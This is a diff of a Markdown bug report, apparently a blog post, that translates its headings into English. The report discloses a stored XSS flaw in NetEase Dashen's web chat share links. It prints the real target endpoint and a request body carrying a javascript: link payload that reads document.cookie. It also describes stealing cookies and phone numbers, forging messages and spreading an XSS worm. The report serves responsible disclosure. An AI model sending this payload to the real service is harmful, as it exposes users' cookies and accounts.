@@ -5,22 +5,22 @@ date:   2023-10-18 10:26:18 +0800
 categories: xss
 ---
 
-## 漏洞名称
+## Name
 
 > 网易大神Web端频道分享帖子存在存储型XSS漏洞
 
-## 漏洞类型
-> web漏洞，存储型XSS
+## Weakness
+> 存储型XSS
 
-## 危害等级
+## Severity
 > 中危
 
-## 漏洞URL
+## URL
 - POST https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg
 - POC网页 https://ds.163.com/channel/0129911649/1111007930/ 打开后点击最新的分享链接，弹出xss弹框
 - POC视频链接：链接：https://pan.baidu.com/s/1aOqi-sLgA5XJIw3FUPiTIw 提取码：1314
 
-## 关键数据包
+## Key Payload
 
     POST /v1/web/chat-room-msg/send-msg HTTP/1.1
     Host: inf-im.ds.163.com
@@ -50,12 +50,12 @@ categories: xss
     { "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": { "attachType": "link", "attachData": { "title": "p", "url": "javascript://%0avar a=\"163.com\";alert(document.cookie);", "desc": "o", "icon": "https://baidu.com/p.png" } }, "contentType": "SHARE" }
 
 
-## 漏洞描述
+## Summary
 网易大神web版中，聊天频道分享帖子时，前后端没有对帖子的链接进行过滤，攻击者能够构造javascript链接，受害者通过点击链接触发XSS执行，攻击者能够窃取用户cookie（包含手机号码），伪造发消息等攻击。
 
-### 详细说明
+### Detail
 请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情
-#### 漏洞触发
+#### Trigger
 1. 登录大神Web平台 https://ds.163.com/
 2. 进入频道，选择任意频道测试发消息，例如进入测试频道 https://ds.163.com/channel/0149881871/1459515/
 发消息测试，并且通过burpsuite观察请求包结构
@@ -207,7 +207,7 @@ categories: xss
     
         前文通过脚本发送合法请求，已经足够证明攻击者能伪造用户发送消息。只需要把该脚本上传到https服务器，并且通过xss payload下载恶意脚本，能够执行更加复杂的逻辑。
 
-### 漏洞证明
+### Proof
 请提供截图或视频
 
     POC视频链接如下：链接：https://pan.baidu.com/s/1aOqi-sLgA5XJIw3FUPiTIw 提取码：1314
@@ -316,11 +316,11 @@ categories: xss
         }
 
 
-## 漏洞危害
+## Impact
 通过发送受诱惑的链接，诱导受害者点击，便可完成xss攻击。注意到大神平台多款游戏频道用户超过几十上百万，影响深远。
 1. 攻击者可以在聊天群发送xss链接，用户点击后能够执行，大规模收集平台用户手机号和账号信息，造成敏感信息泄漏；
 2. 攻击者可以在聊天群发送xss链接，用户点击后能够执行，伪造用户发消息等，制造XSS蠕虫，实现XSS帖子的自我复制，扩大影响。
 
-## 修复建议
+## Patch advice
 1. 对用户的分享链接进行过滤
 
